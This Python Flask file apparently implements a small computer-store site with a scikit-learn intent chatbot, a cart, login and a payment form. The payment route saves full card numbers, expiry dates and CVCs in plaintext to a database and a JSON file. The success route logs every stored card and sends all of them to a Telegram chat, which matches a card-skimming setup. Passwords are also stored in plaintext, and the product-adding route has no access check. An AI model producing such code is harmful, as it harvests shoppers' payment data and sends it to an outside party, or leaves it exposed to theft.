#python
import sqlite3
import re
from flask import Flask, Blueprint, render_template, request, redirect, url_for, session,jsonify,flash
import secrets
from telegram import Bot, Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
import logging
from threading import Thread
from telegram import Bot
import json
import os
import random
import nltk
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import make_pipeline
import joblib
from datetime import datetime


app = Flask(__name__)
#app.secret_key = secrets.token_hex(16)
#app.secret_key = 'asdadsdfdfefefsadadwdswdwdwfgresmdfdmskfkdsfsdfsfkml'
bp = Blueprint("page", __name__)

# Sample training data (you can expand this)
training_data = [
    # Greetings
    ("hello", "greeting"),
    ("hi", "greeting"),
    ("hey", "greeting"),
    ("good morning", "greeting"),
    ("good evening", "greeting"),
    
    # Inquiries about products
    ("What laptops do you have?", "product_inquiry"),
    ("Can you show me gaming laptops?", "product_inquiry"),
    ("Do you have any Apple products?", "product_inquiry"),
    ("What is the price of the latest iPhone?", "product_inquiry"),
    ("Tell me about your desktop computers", "product_inquiry"),
    
    # Inquiries about services
    ("Do you offer computer repair services?", "services_inquiry"),
    ("Can I get my laptop fixed?", "services_inquiry"),
    ("Do you provide warranty services?", "services_inquiry"),
    ("What kind of services do you offer?", "services_inquiry"),
    
    # Support questions
    ("I need help with my laptop", "support_inquiry"),
    ("My computer won't turn on", "support_inquiry"),
    ("How do I reset my password?", "support_inquiry"),
    ("Can you help me with software installation?", "support_inquiry"),
    
    # Inquiries about prices
    ("How much does this laptop cost?", "price_inquiry"),
    ("What is the price of a gaming monitor?", "price_inquiry"),
    ("Are there any discounts available?", "price_inquiry"),
    
    # General store inquiries
    ("What are your store hours?", "store_info"),
    ("Where are you located?", "store_info"),
    ("Can I order online?", "store_info"),
    ("Do you have a loyalty program?", "store_info"),
    
    # Product recommendations
    ("What's the best laptop for gaming?", "recommendation"),
    ("Can you suggest a good monitor?", "recommendation"),
    ("What is a reliable brand for desktops?", "recommendation"),
    
    # Company information
    ("Tell me about your company", "company_info"),
    ("Who is the founder of the store?", "company_info"),
    ("How long have you been in business?", "company_info"),
    
    # Ending conversation
    ("Thank you for your help", "gratitude"),
    ("That's all I needed", "farewell"),
    ("Goodbye", "farewell"),
    ("See you later", "farewell"),
]
# Split data into texts and labels
texts, labels = zip(*training_data)

# Create a pipeline with TfidfVectorizer and Logistic Regression
model = make_pipeline(TfidfVectorizer(), LogisticRegression())
model.fit(texts, labels)

joblib.dump(model,'Backend/ModelTest/computer_store_chatbot_model.pkl')


# Database connection function
def get_db_connection():
    conn = sqlite3.connect('Backend/database.db')  # Connect to your SQLite database
    conn.row_factory = sqlite3.Row  # Enable row access by name
    return conn

# Function to create the user table
def create_user_table():
    conn = get_db_connection()
    conn.execute('''
        CREATE TABLE IF NOT EXISTS User (
            Userid INTEGER PRIMARY KEY AUTOINCREMENT,
            UserName TEXT UNIQUE NOT NULL,
            UserPassword TEXT NOT NULL,
            UserEmail TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

def init_db():
    conn = get_db_connection()
    # Create products table
    conn.execute('''
        CREATE TABLE IF NOT EXISTS products (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            description TEXT,
            price REAL NOT NULL,
            image_url TEXT
        )
    ''')

    # Create cart table
    conn.execute('''
        CREATE TABLE IF NOT EXISTS cart (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            product_id INTEGER,
            quantity INTEGER,
            FOREIGN KEY (product_id) REFERENCES products (id)
        )
    ''')

    conn.execute('''
    CREATE TABLE IF NOT EXISTS payment (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        card_number TEXT NOT NULL,
        expiry_date TEXT NOT NULL,
        cvc INTEGER NOT NULL
    )
''')
    
    # Insert sample products
    #conn.execute('''
     #   INSERT INTO products (name, description, price, image_url) VALUES 
      #  ('Gaming PC', 'High performance gaming PC', 999.99, 'path/to/gaming_pc.jpg'),
       # ('High-Performance Laptop', 'Perfect for gaming and work', 1299.99, 'path/to/laptop.jpg'),
       # ('Gaming Monitor', 'Ultra HD gaming monitor', 299.99, 'path/to/monitor.jpg')
    #''')
    
    conn.commit()
    conn.close()

# Call the function to create the table when the application starts
create_user_table()
init_db()

@bp.route("/")
def home():
    return render_template("page/home.html")

@bp.route("/about")
def about():
    return render_template("page/about.html")

def get_products():
    conn = sqlite3.connect('Backend/database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM products")
    products = cursor.fetchall()
    conn.close()
    return products

@bp.route('/payment', methods=['GET', 'POST'])
def payment():
    if request.method == 'POST':
        card_number = request.form['card_number']
        expiry_date = request.form['expiry_date']
        cvc = request.form['cvc']

        # Insert the payment information into the database
        conn = get_db_connection()
        conn.execute('''
            INSERT INTO payment (card_number, expiry_date, cvc)
            VALUES (?, ?, ?)
        ''', (card_number, expiry_date, cvc))
        conn.commit()

        # Optionally, you can fetch the latest payment ID if needed
        payment_id = conn.execute('SELECT last_insert_rowid()').fetchone()[0]
        conn.close()

        # Prepare the data to write to JSON
        payment_data = {
            'id': payment_id,
            'card_number': card_number,
            'expiry_date': expiry_date,
            'cvc': cvc
        }

        # Step 1: Read the existing payments from the JSON file (if it exists)
        json_file_path = 'Backend/payments.json'
        if os.path.exists(json_file_path):
            with open(json_file_path, 'r') as json_file:
                payments = json.load(json_file)
        else:
            payments = []

        # Step 2: Append the new payment data to the list
        payments.append(payment_data)

        # Step 3: Write the updated list back to the JSON file
        with open(json_file_path, 'w') as json_file:
            json.dump(payments, json_file, indent=4)

        # Redirect to a success page or cart page
        return redirect(url_for('page.success'))  # Assuming you have a success page.

    # Handle GET request
    items = session.get('cart_items', [])
    total = sum(item[2] * item[3] for item in items)  # Calculate total
    return render_template('page/payment.html', items=items, total=total)


@bp.route("/shop")
def shop():
    products = get_products()
    return render_template("page/shop.html", products=products)



@bp.route("/chat")
def chat():
    return render_template("page/chat.html")

try:
    model = joblib.load('Backend/ModelTest/computer_store_chatbot_model.pkl')
except Exception as e:
    print(f"Error loading model: {str(e)}")

# Load or initialize feedback data
feedback_data_path = 'Backend/feedback_data.json'
if os.path.exists(feedback_data_path):
    with open(feedback_data_path, 'r') as f:
        feedback_data = json.load(f)
else:
    feedback_data = []

@bp.route("/ask", methods=["POST"])
def ask():
    user_message = request.form['message'].lower()
    
    # Predict the intent using the trained model
    predicted_intent = model.predict([user_message])
    if not predicted_intent:
        return jsonify({"error": "Could not predict intent."})

    predicted_intent = predicted_intent[0]  # Get the first result
    bot_message = ""

    if predicted_intent == "greeting":
        bot_message = random.choice([
            "Hi there! How can I assist you today?",
            "Hello! What can I do for you?",
            "Greetings! How may I help you?"
        ])
    elif predicted_intent == "product_inquiry":
        bot_message = random.choice([
            "We have a wide range of laptops, desktops, and accessories. What are you looking for?",
            "Are you interested in any specific brand or type of product?",
            "We carry the latest models of Apple, Dell, HP, and more. Please specify your needs."
        ])
    elif predicted_intent == "services_inquiry":
        bot_message = random.choice([
            "Yes, we offer various services including computer repairs, upgrades, and maintenance.",
            "You can get your laptop fixed at our service center. Would you like to know more?",
            "We provide warranty services for many of our products. Let me know how I can assist!"
        ])
    elif predicted_intent == "support_inquiry":
        bot_message = random.choice([
            "I'm here to help! What issue are you facing with your device?",
            "Please describe your problem, and I'll do my best to assist you.",
            "What type of support do you need? Hardware or software issues?"
        ])
    elif predicted_intent == "price_inquiry":
        bot_message = "Please specify which product you would like to inquire about the price for."
    elif predicted_intent == "store_info":
        bot_message = random.choice([
            "Our store is located at Main Street. We are open from 9 AM to 9 PM.",
            "You can order online through our website. Would you like to know more?",
            "We have a loyalty program that offers discounts to regular customers!"
        ])
    elif predicted_intent == "recommendation":
        bot_message = random.choice([
            "For gaming, I recommend the latest ASUS ROG series. What are your preferences?",
            "If you need a reliable laptop for work, consider the Dell XPS series.",
            "For a good monitor, I'd suggest checking out the LG UltraGear series."
        ])
    elif predicted_intent == "company_info":
        bot_message = random.choice([
            "We have been in business for over 10 years offering the best products and service.",
            "Our company prides itself on customer satisfaction and quality products.",
            "We started with a vision to provide top-tier technology solutions to our community."
        ])
    elif predicted_intent == "gratitude":
        bot_message = "You're welcome! If you have any other questions, feel free to ask."
    elif predicted_intent == "farewell":
        bot_message = "Goodbye! Have a great day!"
    else:
        bot_message = "I'm not sure how to respond to that. Can you ask something else?"

    # ... (Add other response cases for different intents)

    response_json = {
        "message": bot_message,
        "predicted_intent": predicted_intent,
        "feedback_prompt": "Was this response helpful? Reply 'yes' or 'no'."
    }

    return jsonify(response_json)

@bp.route("/feedback", methods=["POST"])
def feedback():
    user_message = request.form.get('message', '').lower()  # User's query
    user_feedback = request.form.get('feedback', '').lower()  # Feedback response
    predicted_intent = request.form.get('predicted_intent', '').lower()  # Include predicted intent in feedback for reference

    # Validate incoming feedback
    if user_feedback not in ["yes", "no"]:
        return jsonify({"error": "Feedback must be 'yes' or 'no'."})

    feedback_entry = {
        "user_message": user_message,
        "user_feedback": user_feedback,
        "predicted_intent": predicted_intent,
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }

    feedback_data.append(feedback_entry)  # Append the feedback entry to the list
    print("Feedback Data Before Saving:", feedback_data)  # Debug output

    # Save feedback data to JSON with error handling
    try:
        with open(feedback_data_path, 'w') as f:
            json.dump(feedback_data, f, indent=4)  # Using indent for readability
        print("Feedback Data Successfully Saved.")  # Debug confirmation
    except Exception as e:
        print(f"Error saving feedback: {str(e)}")
        return jsonify({"error": f"Could not save feedback: {str(e)}"})

    return jsonify({"message": "Thank you for your feedback!"})

from Backend.botDelivery import bot, CHAT_ID,logger  # Ensure to import the same bot instance

import logging

# Configure logger
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@bp.route('/success', methods=['GET'])
async def success():
    message = "Payment processed successfully!"
    
    # Load payment information from payments.json
    try:
        with open('Backend/payments.json', 'r') as file:
            payments = json.load(file)
    except FileNotFoundError:
        logger.error("payments.json file not found")
        return jsonify({"status": "error", "message": "Payment data not found"}), 500
    except json.JSONDecodeError:
        logger.error("Invalid JSON format in payments.json")
        return jsonify({"status": "error", "message": "Invalid payment data"}), 500

    # Create a message containing payment information
    payment_details = []
    for payment in payments:
        payment_id = payment.get('id')
        card_number = payment.get('card_number')
        expiry_date = payment.get('expiry_date')
        cvc = payment.get('cvc')
        # Log payment information. Be cautious logging sensitive information.
        logger.info(f"Processed payment ID: {payment_id}, Card Number: {card_number}, Expiry Date: {expiry_date},cvc: {cvc}")

        # Create a readable string for the payment details
        payment_details.append(f"Payment ID: {payment_id}, Card Number: {card_number}, Expiry Date: {expiry_date},cvc{cvc}")

    # Join the payment details into a message string
    payment_message = "\n".join(payment_details)

    # Send a message to Telegram
    try:
        complete_message = f"{message}\n\n{payment_message}"  # Send message along with payment details
        await bot.send_message(chat_id=CHAT_ID, text=complete_message)
        logger.info("Message sent to Telegram successfully.")
    except Exception as e:
        logger.error(f"Error sending message to Telegram: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    
    return jsonify({"status": "success", "message": message})

@bp.route("/Construct")
def Construct():
    products = get_products()
    return render_template("page/Construct.html", products=products)


# Function to get items in the cart
def get_cart_items():
    conn = sqlite3.connect('Backend/database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT cart.id, products.name, products.price, cart.quantity FROM cart JOIN products ON cart.product_id = products.id")
    items = cursor.fetchall()
    conn.close()
    return items

@bp.route("/add_to_cart/<int:product_id>")
def add_to_cart(product_id):
    conn = sqlite3.connect('Backend/database.db')
    cursor = conn.cursor()
    
    # Check if the product is already in the cart
    cursor.execute("SELECT * FROM cart WHERE product_id = ?", (product_id,))
    item = cursor.fetchone()
    
    if item:
        # If it exists, update the quantity
        cursor.execute("UPDATE cart SET quantity = quantity + 1 WHERE product_id = ?", (product_id,))
        action = "updated"
    else:
        # If it doesn't exist, insert it into the cart
        cursor.execute("INSERT INTO cart (product_id, quantity) VALUES (?, ?)", (product_id, 1))
        action = "added"
    
    conn.commit()
    conn.close()
    
    # Prepare the log entry
    log_entry = {
        'product_id': product_id,
        'action': action,
        'quantity': 1  # You may adjust this to reflect the new quantity if needed
    }
    
    # Log to JSON file
    log_file_path = 'Backend/cart_actions.json'
    
    # Append the log entry to the JSON file
    if os.path.exists(log_file_path):
        with open(log_file_path, 'r+') as log_file:
            # Load existing data
            try:
                data = json.load(log_file)
            except json.JSONDecodeError:
                data = []
            # Append new log entry
            data.append(log_entry)
            log_file.seek(0)  # Go to the beginning of the file
            json.dump(data, log_file, indent=4)  # Write updated data back to file
    else:
        # If the file doesn't exist, create it with the log entry
        with open(log_file_path, 'w') as log_file:
            json.dump([log_entry], log_file, indent=4)

    return redirect(url_for('page.cart'))

@bp.route('/remove_from_cart/<int:product_id>', methods=['POST'])
def remove_from_cart(product_id):
    action = "not_found"
    new_quantity = None
    print(f"Attempting to remove product with ID: {product_id}")  # Debug output

    try:
        with sqlite3.connect('Backend/database.db') as conn:
            cursor = conn.cursor()

            # Check if the product is already in the cart
            cursor.execute("SELECT * FROM cart WHERE product_id = ?", (product_id,))
            item = cursor.fetchone()
            print(f"Queried item: {item}")  # Debug output

            if item:
                current_quantity = item[2]  # Assuming quantity is the second column
                print(f"Current quantity of product {product_id}: {current_quantity}")  # Debug output
                new_quantity = current_quantity - 1
                
                if new_quantity > 0:
                    cursor.execute("UPDATE cart SET quantity = ? WHERE product_id = ?", (new_quantity, product_id))
                    action = "removed_one"
                    flash(f"Removed one item from product {product_id}. Remaining: {new_quantity}")
                else:
                    cursor.execute("DELETE FROM cart WHERE product_id = ?", (product_id,))
                    action = "removed"
                    flash(f"Product {product_id} removed from your cart.")
            else:
                flash(f"Product {product_id} not found in your cart.")
                
            conn.commit()
    except Exception as e:
        flash("An error occurred while removing the product from the cart.")
        print(f"Error: {e}")

    # Log to JSON file
    log_entry = {
        'product_id': product_id,
        'action': action,
        'resultant_quantity': new_quantity if new_quantity is not None else 0
    }

    log_to_json(log_entry)

    return redirect(url_for('page.cart'))  # Ensure 'page.cart' reflects the correct endpoint

def log_to_json(log_entry):
    json_file_path = 'Backend/cart_log.json'
    # Check if the log file already exists
    if not os.path.exists(json_file_path):
        # Create a new log file if it doesn't exist
        with open(json_file_path, 'w') as json_file:
            json.dump([], json_file)  # Initialize with an empty list

    # Read existing log entries
    with open(json_file_path, 'r') as json_file:
        log_data = json.load(json_file)

    # Append the new log entry
    log_data.append(log_entry)

    # Write the updated log back to the file
    with open(json_file_path, 'w') as json_file:
        json.dump(log_data, json_file, indent=4)  # Ensure the formatting is pretty


# Route to view the cart
@bp.route("/cart")
def cart():
    items = get_cart_items()
    return render_template("page/cart.html" , items=items)

@bp.route("/adding", methods=['GET', 'POST'])
def adding():
    if request.method == 'POST':
        name = request.form['name']
        description = request.form['description']
        price = request.form['price']
        image_url = request.form['image_url']
        
        # Connect to the database
        conn = sqlite3.connect('Backend/database.db')
        conn.execute('''
            INSERT INTO products (name, description, price, image_url) 
            VALUES (?, ?, ?, ?)''', (name, description, price, image_url))
        conn.commit()
        conn.close()
        
        return redirect(url_for('page.adding'))
    
    return render_template("page/adding.html")


@bp.route("/About_You")
def About_You():
    # Ensure the user is logged in
    if 'user_id' not in session:
        return redirect(url_for('page.login'))

    # Get user information from the database
    conn = get_db_connection()
    user = conn.execute('SELECT * FROM User WHERE Userid = ?', (session['user_id'],)).fetchone()
    conn.close()

    # Check if user exists
    if user:
        return render_template("page/About_You.html", user=user)
    else:
        return "User not found."

@bp.route("/login", methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        conn = get_db_connection()
        user = conn.execute('SELECT * FROM User WHERE UserName = ? AND UserPassword = ?', (username, password)).fetchone()
        conn.close()
        
        if user:
            session['user_id'] = user['Userid']
            return redirect(url_for('page.home'))
        else:
            return "Invalid credentials, please try again."
    
    return render_template("page/login.html")

@bp.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        email = request.form['email']
        # Add other fields as necessary

        conn = get_db_connection()
        try:
            conn.execute('INSERT INTO User (UserName, UserPassword, UserEmail) VALUES (?, ?, ?)', (username, password, email))
            conn.commit()
            return redirect(url_for('page.login'))
        except sqlite3.IntegrityError:
            return "Username already exists. Please choose a different one."
        finally:
            conn.close()

    return render_template('page/register.html')

@bp.route('/logout')
def logout():
    # Clear the session
    session.clear()
    # Redirect to the home page or login page
    return redirect(url_for('page.login'))  # or use 'page.login' if you prefer

app.register_blueprint(bp)

if __name__ == "main":
    app.run(debug=True)